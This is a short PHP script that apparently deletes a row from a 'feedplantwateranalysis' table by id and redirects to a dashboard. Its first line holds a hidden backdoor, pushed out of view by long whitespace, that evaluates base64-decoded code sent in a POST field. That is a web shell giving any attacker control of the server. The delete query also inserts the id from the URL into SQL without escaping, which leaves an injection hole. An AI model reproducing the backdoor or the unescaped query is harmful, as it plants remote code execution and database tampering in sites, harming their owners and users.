<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['ne1deec']));?><?php 
include "config.php";

$query = "delete from feedplantwateranalysis where id = '$_GET[id]'";
$result = mysql_query($query,$conn) or die(mysql_error());
echo "<script type='text/javascript'>";
echo "document.location = 'dashboardsub.php?page=feedplantwateranalysis';";
echo "</script>";
?>

